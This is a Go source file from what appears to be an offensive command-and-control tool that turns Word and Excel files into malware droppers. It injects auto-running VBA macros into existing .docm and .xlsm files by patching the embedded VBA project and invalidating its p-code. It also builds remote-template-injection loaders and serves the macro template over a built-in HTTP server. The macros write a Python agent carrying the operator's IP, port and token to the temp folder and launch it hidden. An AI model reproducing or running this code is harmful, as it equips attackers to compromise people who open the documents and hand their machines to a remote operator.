package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func injectMacroIntoOffice(inputPath, officeType string, sess *Session) error {
	if sess == nil {
		return fmt.Errorf("no active session")
	}

	lower := strings.ToLower(inputPath)
	if !strings.HasSuffix(lower, ".docm") && !strings.HasSuffix(lower, ".xlsm") {
		return fmt.Errorf("input must be .docm or .xlsm file")
	}

	if _, err := os.Stat(inputPath); os.IsNotExist(err) {
		return fmt.Errorf("input file not found: %s", inputPath)
	}

	pythonCode := generatePythonAgent(sess.IP, sess.Port, sess.Token, sess.Persistent)

	var payloadMacro string
	if officeType == "excel" {
		payloadMacro = generateExcelMacro(pythonCode)
	} else {
		payloadMacro = generateVBAMacro(pythonCode)
	}

	tempDir, err := os.MkdirTemp("", "aether-macro-*")
	if err != nil {
		return err
	}
	defer os.RemoveAll(tempDir)

	outputPath := filepath.Join(payloadsDir, filepath.Base(inputPath))
	safeMacro := strings.ReplaceAll(payloadMacro, `"""`, `\"\"\"`)

	vbaBinPath := "word/vbaProject.bin"
	if officeType == "excel" {
		vbaBinPath = "xl/vbaProject.bin"
	}

	pythonScript := fmt.Sprintf(`
import struct, zipfile, shutil, tempfile, os, sys

ENDOFCHAIN=0xFFFFFFFE; FREESECT=0xFFFFFFFF

def _cth(ds):
    bc = 12 if ds<=16 else 11 if ds<=32 else 10 if ds<=64 else 9 if ds<=128 else \
         8 if ds<=256 else 7 if ds<=512 else 6 if ds<=1024 else 5 if ds<=2048 else 4
    lm = (1<<(16-bc))-1
    return lm, (~lm)&0xFFFF, bc

def vba_decompress(src):
    out=bytearray(); i=1 if src and src[0]==1 else 0
    while i<len(src)-1:
        h=struct.unpack_from('<H',src,i)[0]; i+=2
        comp=(h>>12)&1; csz=(h&0xFFF)+3 if comp else 4098
        chunk=src[i:i+(csz-2 if comp else 4096)]; i+=(csz-2 if comp else 4096)
        if not comp: out+=chunk[:4096]; continue
        j=0; cs=len(out)
        while j<len(chunk):
            fl=chunk[j]; j+=1
            for b in range(8):
                if j>=len(chunk): break
                if (fl>>b)&1:
                    if j+1>=len(chunk): break
                    t=struct.unpack_from('<H',chunk,j)[0]; j+=2
                    lm,_,bc=_cth(len(out)-cs)
                    ln=(t&lm)+3; off=((t&~lm)>>(16-bc))+1
                    base=len(out)-off
                    for k in range(ln):
                        idx=base+k
                        out.append(out[idx] if 0<=idx<len(out) else 0)
                else: out.append(chunk[j]); j+=1
    return bytes(out)

def find_src_offset(data):
    for i in range(len(data)-3):
        if data[i]==0x01:
            try:
                h=struct.unpack_from('<H',data,i+1)[0]
                dec=vba_decompress(data[i:])
                if dec and b'Attribute' in dec[:64]:
                    return i
            except: continue
    return 0

def vba_compress(src):
    if isinstance(src,str): src=src.encode('latin-1','replace')
    out=bytearray([0x01])
    for ci in range(0,max(len(src),1),4096):
        chunk=(src[ci:ci+4096]+b'\x00'*4096)[:4096]
        out+=struct.pack('<H',0x6FFE)+chunk
    return bytes(out)

def parse_offsets(dr):
    offs={}; i=0; cur=None
    while i<len(dr)-5:
        try:
            rid=struct.unpack_from('<H',dr,i)[0]; rsz=struct.unpack_from('<I',dr,i+2)[0]
            dat=dr[i+6:i+6+rsz]
        except: break
        if rid==0x0019: cur=dat.decode('latin-1','ignore')
        elif rid==0x0031 and rsz==4 and cur: offs[cur]=struct.unpack_from('<I',dat)[0]
        i+=6+rsz
    return offs

class CFB:
    def __init__(self, raw):
        self.raw=bytearray(raw)
        ss=self.ss=2**struct.unpack_from('<H',raw,30)[0]
        self.mc=struct.unpack_from('<I',raw,56)[0]
        self.mss=2**struct.unpack_from('<H',raw,32)[0]
        eper=self.eper=ss//4
        fsids=[d for d in struct.unpack_from('<109I',raw,76) if d<0xFFFFFFFC]
        self._fsids=fsids
        fat=self.fat=[]
        for d in fsids: fat+=list(struct.unpack_from('<'+str(eper)+'I',raw,512+d*ss))
        ds=struct.unpack_from('<I',raw,48)[0]
        self._dc=self._chain(ds)
        dd=self._dd=bytearray(self._chain_bytes(ds))
        entries=self.entries=[]
        for i in range(len(dd)//128):
            o=i*128; nl=struct.unpack_from('<H',dd,o+64)[0]
            n=dd[o:o+max(0,nl-2)].decode('utf-16-le','ignore') if nl>=2 else ''
            entries.append({'n':n,'t':dd[o+66],'s':struct.unpack_from('<I',dd,o+116)[0],
                            'z':struct.unpack_from('<I',dd,o+120)[0],'o':o})
        mfat_start=struct.unpack_from('<I',raw,60)[0]
        mfat=self.mfat=[]
        cur=mfat_start
        while cur<0xFFFFFFFC:
            mfat+=list(struct.unpack_from('<'+str(eper)+'I',raw,512+cur*ss))
            cur=fat[cur]
        root=entries[0] if entries else None
        if root and root['s']<0xFFFFFFFC:
            self._mini=bytearray(self._chain_bytes(root['s']))
        else:
            self._mini=bytearray()

    def _chain(self,s):
        c=[]; cur=s
        while cur<0xFFFFFFFC: c.append(cur); cur=self.fat[cur]
        return c

    def _chain_bytes(self,s):
        return b''.join(self.raw[512+x*self.ss:512+(x+1)*self.ss] for x in self._chain(s))

    def read_stream(self,e):
        if e['z']>=self.mc:
            return self._chain_bytes(e['s'])
        data=bytearray(); cur=e['s']
        while cur<0xFFFFFFFC:
            data+=self._mini[cur*self.mss:(cur+1)*self.mss]; cur=self.mfat[cur]
        return bytes(data)

    def write_stream(self,name,new_data):
        e=next((x for x in self.entries if x['n']==name and x['t']==2),None)
        if not e: return f"stream '{name}' not found"
        if e['z']>=self.mc and e['s']<0xFFFFFFFC:
            cur=e['s']
            while cur<0xFFFFFFFC: nxt=self.fat[cur]; self.fat[cur]=FREESECT; cur=nxt
        nd=bytearray(new_data); nd+=b'\x00'*((-len(nd))%%self.ss); need=len(nd)//self.ss
        free=[i for i,v in enumerate(self.fat) if v==FREESECT]
        secs=free[:need]
        while len(secs)<need:
            idx=(len(self.raw)-512)//self.ss; self.raw+=bytearray(self.ss)
            self.fat.append(FREESECT); secs.append(idx)
        for i,s in enumerate(secs): self.fat[s]=secs[i+1] if i+1<need else ENDOFCHAIN
        needed=512+(max(secs)+1)*self.ss
        if len(self.raw)<needed: self.raw+=bytearray(needed-len(self.raw))
        for i,s in enumerate(secs): self.raw[512+s*self.ss:512+(s+1)*self.ss]=nd[i*self.ss:(i+1)*self.ss]
        struct.pack_into('<I',self._dd,e['o']+116,secs[0])
        struct.pack_into('<I',self._dd,e['o']+120,len(new_data))
        for i,s in enumerate(self._dc): self.raw[512+s*self.ss:512+(s+1)*self.ss]=self._dd[i*self.ss:(i+1)*self.ss]
        for fi,d in enumerate(self._fsids):
            chunk=(self.fat[fi*self.eper:(fi+1)*self.eper]+[FREESECT]*self.eper)[:self.eper]
            self.raw[512+d*self.ss:512+(d+1)*self.ss]=struct.pack('<'+str(self.eper)+'I',*chunk)
        return None

    def get_bytes(self): return bytes(self.raw)

input_file  = "%s"
output_file = "%s"
vba_bin     = "%s"
new_source  = """%s"""
new_source  = new_source.replace('\n','\r\n').lstrip('\r\n')

try:
    if not zipfile.is_zipfile(input_file):
        print("[!] Error: not an OOXML file"); sys.exit(1)

    tmp=tempfile.mkdtemp()
    with zipfile.ZipFile(input_file) as z: z.extractall(tmp)

    bp=os.path.join(tmp,vba_bin.replace('/',os.sep))
    if not os.path.exists(bp):
        print("[!] vbaProject.bin missing — open in Word, add Sub Dummy() End Sub, save"); sys.exit(1)

    with open(bp,'rb') as f: raw=f.read()
    cfb=CFB(raw)

    skip={'_VBA_PROJECT','dir','\x01CompObj','\x01Ole','VBA',''}
    mods=[e for e in cfb.entries if e['t']==2 and e['n'] not in skip]
    if not mods: print("[!] No VBA module streams found"); sys.exit(1)

    dir_e=next((e for e in cfb.entries if e['n']=='dir' and e['t']==2),None)
    src_offsets={}
    if dir_e:
        try: src_offsets=parse_offsets(vba_decompress(cfb.read_stream(dir_e)))
        except Exception as de: print(f"[*] dir decompress warn: {de}")
    print(f"[*] src_offsets: {src_offsets}")

    target=next((m for m in mods if m['n'] in src_offsets),mods[0])
    mod_name=target['n']
    src_off=src_offsets.get(mod_name,0)
    print(f"[*] Module: {mod_name}, source offset: {src_off}")

    mod_data=cfb.read_stream(target)
    if not src_off and len(mod_data)>3:
        src_off=find_src_offset(mod_data)
        print(f"[*] Scanned source offset: {src_off}")
    p_code=mod_data[:src_off]
    full_src=(f'Attribute VB_Name = "{mod_name}"\r\n'+new_source).encode('latin-1','replace')
    new_mod=p_code+vba_compress(full_src)

    vp=next((e for e in cfb.entries if e['n']=='_VBA_PROJECT' and e['t']==2),None)
    if vp:
        vp_data=bytearray(cfb.read_stream(vp))
        if len(vp_data)>=4:
            vp_data[2]=0xFF; vp_data[3]=0xFF
            cfb.write_stream('_VBA_PROJECT',bytes(vp_data))
            print("[*] P-code invalidated in _VBA_PROJECT")

    err=cfb.write_stream(mod_name,new_mod)
    if err: print(f"[!] CFB error: {err}"); sys.exit(1)

    with open(bp,'wb') as f: f.write(cfb.get_bytes())

    with zipfile.ZipFile(output_file,'w',zipfile.ZIP_DEFLATED) as zout:
        for r2,dirs,files in os.walk(tmp):
            for fn in files:
                fp=os.path.join(r2,fn)
                zout.write(fp,os.path.relpath(fp,tmp).replace(os.sep,'/'))

    shutil.rmtree(tmp)
    print(f"[+] Injected into: {mod_name}")
    print(f"[+] Saved: {output_file}")

except SystemExit: raise
except Exception as ex:
    import traceback; traceback.print_exc()
    print(f"[!] Error: {ex}"); sys.exit(1)
`, inputPath, outputPath, vbaBinPath, safeMacro)

	scriptPath := filepath.Join(tempDir, "inject.py")
	if err := os.WriteFile(scriptPath, []byte(pythonScript), 0644); err != nil {
		return err
	}

	cmd := exec.Command("python3", scriptPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to inject macro: %v\nOutput: %s", err, string(output))
	}

	fmt.Printf("%s%s%s\n", ColorBlue, string(output), ColorReset)
	fmt.Printf("%s[+] Weaponized file created: %s%s\n", ColorGreen, outputPath, ColorReset)
	fmt.Printf("%s[*] Token: %s...%s\n", ColorBlue, sess.Token[:8], ColorReset)
	return nil
}

func createTemplateInjection(sess *Session, officeType string, templateURL string) error {
	if sess == nil {
		return fmt.Errorf("no active session")
	}

	pythonCode := generatePythonAgent(sess.IP, sess.Port, sess.Token, sess.Persistent)

	var macroCode, loaderExt, templateExt string
	switch officeType {
	case "excel":
		macroCode = generateExcelMacro(pythonCode)
		loaderExt = "xlsx"
		templateExt = "xltm"
	case "word":
		macroCode = generateVBAMacro(pythonCode)
		loaderExt = "docx"
		templateExt = "dotm"
	default:
		return fmt.Errorf("unsupported office type: %s", officeType)
	}

	tempDir, err := os.MkdirTemp("", "aether-template-*")
	if err != nil {
		return err
	}
	defer os.RemoveAll(tempDir)

	vbaPath := filepath.Join(tempDir, "payload.vba")
	if err := os.WriteFile(vbaPath, []byte(macroCode), 0644); err != nil {
		return err
	}

	templatePath := filepath.Join(payloadsDir, fmt.Sprintf("%s_template.%s", sess.Name, templateExt))
	loaderPath := filepath.Join(payloadsDir, fmt.Sprintf("%s.%s", sess.Name, loaderExt))

	var useBuiltinServer bool
	if templateURL == "" {
		useBuiltinServer = true
		templateURL = fmt.Sprintf("http://%s:8080/template.%s", getLocalIP(), templateExt)
	}

	var cmd *exec.Cmd
	if officeType == "excel" {
		cmd = exec.Command("python3", "-c", fmt.Sprintf(`
import zipfile
import os

template = zipfile.ZipFile('%s', 'w', zipfile.ZIP_DEFLATED)

dirs = ['_rels', 'xl', 'xl/_rels', 'xl/theme', 'xl/worksheets', 'docProps']
for d in dirs:
    template.writestr(d + '/', '')

rels_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>
</Relationships>'''
template.writestr('_rels/.rels', rels_content)

workbook_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
<Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/>
</Relationships>'''
template.writestr('xl/_rels/workbook.xml.rels', workbook_rels)

workbook_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<fileVersion appName="xl" lastEdited="4" lowestEdited="4" rupBuild="4505"/>
<workbookPr defaultThemeVersion="124226"/>
<sheets>
<sheet name="Sheet1" sheetId="1" r:id="rId1"/>
</sheets>
</workbook>'''
template.writestr('xl/workbook.xml', workbook_content)

sheet_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData>
<row r="1"><c r="A1"><v>1</v></c></row>
</sheetData>
</worksheet>'''
template.writestr('xl/worksheets/sheet1.xml', sheet_content)

theme_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Office Theme">
<a:themeElements>
<a:clrScheme name="Office">
<a:dk1><a:sysClr val="windowText" lastClr="000000"/></a:dk1>
<a:lt1><a:sysClr val="window" lastClr="FFFFFF"/></a:lt1>
</a:clrScheme>
<a:fontScheme name="Office">
<a:majorFont><a:latin typeface="Calibri"/></a:majorFont>
<a:minorFont><a:latin typeface="Calibri"/></a:minorFont>
</a:fontScheme>
<a:fmtScheme name="Office">
<a:fillStyleLst><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:fillStyleLst>
</a:fmtScheme>
</a:themeElements>
</a:theme>'''
template.writestr('xl/theme/theme1.xml', theme_content)

core_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/">
<dc:title>Template</dc:title>
</cp:coreProperties>'''
template.writestr('docProps/core.xml', core_content)

content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.template.macroEnabled.main+xml"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
<Override PartName="/xl/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/>
<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>'''
template.writestr('[Content_Types].xml', content_types)

with open('%s', 'rb') as f:
    vba_data = f.read()
template.writestr('xl/vbaProject.bin', vba_data)

template.close()

loader = zipfile.ZipFile('%s', 'w', zipfile.ZIP_DEFLATED)

loader_dirs = ['_rels', 'xl', 'xl/_rels', 'xl/theme', 'xl/worksheets', 'docProps']
for d in loader_dirs:
    loader.writestr(d + '/', '')

loader_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>
</Relationships>'''
loader.writestr('_rels/.rels', loader_rels)

loader_wb_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/>
<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="%s" TargetMode="External"/>
</Relationships>'''
loader.writestr('xl/_rels/workbook.xml.rels', loader_wb_rels)

loader_wb = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<fileVersion appName="xl" lastEdited="4" lowestEdited="4" rupBuild="4505"/>
<workbookPr defaultThemeVersion="124226"/>
<sheets>
<sheet name="Sheet1" sheetId="1" r:id="rId1"/>
</sheets>
</workbook>'''
loader.writestr('xl/workbook.xml', loader_wb)

loader.writestr('xl/worksheets/sheet1.xml', sheet_content)
loader.writestr('xl/theme/theme1.xml', theme_content)
loader.writestr('docProps/core.xml', core_content)

loader_ct = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
<Override PartName="/xl/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/>
<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
</Types>'''
loader.writestr('[Content_Types].xml', loader_ct)

loader.close()
`, templatePath, vbaPath, loaderPath, templateURL))
	} else {
		cmd = exec.Command("python3", "-c", fmt.Sprintf(`
import zipfile
import os

template = zipfile.ZipFile('%s', 'w', zipfile.ZIP_DEFLATED)

dirs = ['_rels', 'word', 'word/_rels', 'docProps']
for d in dirs:
    template.writestr(d + '/', '')

rels_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>
</Relationships>'''
template.writestr('_rels/.rels', rels_content)

document_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
</Relationships>'''
template.writestr('word/_rels/document.xml.rels', document_rels)

document_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p>
<w:pPr><w:pStyle w:val="Normal"/></w:pPr>
<w:r><w:t>Template</w:t></w:r>
</w:p>
<w:sectPr>
<w:pgSz w:w="12240" w:h="15840"/>
<w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440"/>
</w:sectPr>
</w:body>
</w:document>'''
template.writestr('word/document.xml', document_content)

core_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/">
<dc:title>Template</dc:title>
</cp:coreProperties>'''
template.writestr('docProps/core.xml', core_content)

content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.template.macroEnabledTemplate.main+xml"/>
<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>'''
template.writestr('[Content_Types].xml', content_types)

with open('%s', 'rb') as f:
    vba_data = f.read()
template.writestr('word/vbaProject.bin', vba_data)

template.close()

loader = zipfile.ZipFile('%s', 'w', zipfile.ZIP_DEFLATED)

loader_dirs = ['_rels', 'word', 'word/_rels', 'docProps']
for d in loader_dirs:
    loader.writestr(d + '/', '')

settings_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="%s" TargetMode="External"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''
loader.writestr('_rels/.rels', settings_rels)

loader_doc_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>
</Relationships>'''
loader.writestr('word/_rels/document.xml.rels', loader_doc_rels)

loader_document = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p>
<w:pPr><w:pStyle w:val="Normal"/></w:pPr>
<w:r><w:t>Loading...</w:t></w:r>
</w:p>
<w:sectPr>
<w:pgSz w:w="12240" w:h="15840"/>
<w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440"/>
</w:sectPr>
</w:body>
</w:document>'''
loader.writestr('word/document.xml', loader_document)

settings_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<w:attachedTemplate r:id="rId1"/>
</w:settings>'''
loader.writestr('word/settings.xml', settings_content)

loader.writestr('docProps/core.xml', core_content)

loader_ct = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
<Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
</Types>'''
loader.writestr('[Content_Types].xml', loader_ct)

loader.close()
`, templatePath, vbaPath, loaderPath, templateURL))
	}

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to create template injection files: %v", err)
	}

	if useBuiltinServer {
		templateData, err := os.ReadFile(templatePath)
		if err != nil {
			return err
		}
		startTemplateServer(templateData, fmt.Sprintf("template.%s", templateExt))
		fmt.Printf("%s[+] Started built-in HTTP server on port 8080%s\n", ColorGreen, ColorReset)
	}

	fmt.Printf("%s[+] Generated loader: %s%s\n", ColorGreen, loaderPath, ColorReset)
	if useBuiltinServer {
		fmt.Printf("%s[+] Template served from: %s%s\n", ColorBlue, templateURL, ColorReset)
	}
	fmt.Printf("%s[*] Token: %s...%s\n", ColorBlue, sess.Token[:8], ColorReset)
	return nil
}

func generateVBAMacro(pythonCode string) string {
	lines := strings.Split(pythonCode, "\n")
	var printLines strings.Builder
	for _, line := range lines {
		escaped := strings.ReplaceAll(line, "\"", "\"\"")
		printLines.WriteString("    Print #fileNum, \"")
		printLines.WriteString(escaped)
		printLines.WriteString("\"\n")
	}

	return `Sub AutoOpen()
    ExecutePayload
End Sub

Sub DocumentOpen()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim tempPath As String
    Dim wsh As Object
    Dim fileNum As Integer

    tempPath = Environ("TEMP") & "\agent.py"
    fileNum = FreeFile
    Open tempPath For Output As #fileNum
` + printLines.String() + `    Close #fileNum

    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "python """ & tempPath & """", 0, False

    Set wsh = Nothing
End Sub
`
}

func generateExcelMacro(pythonCode string) string {
	lines := strings.Split(pythonCode, "\n")
	var printLines strings.Builder
	for _, line := range lines {
		escaped := strings.ReplaceAll(line, "\"", "\"\"")
		printLines.WriteString("    Print #fileNum, \"")
		printLines.WriteString(escaped)
		printLines.WriteString("\"\n")
	}

	return `Sub Auto_Open()
    ExecutePayload
End Sub

Sub Workbook_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim tempPath As String
    Dim wsh As Object
    Dim fileNum As Integer

    tempPath = Environ("TEMP") & "\agent.py"
    fileNum = FreeFile
    Open tempPath For Output As #fileNum
` + printLines.String() + `    Close #fileNum

    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "python """ & tempPath & """", 0, False

    Set wsh = Nothing
End Sub
`
}
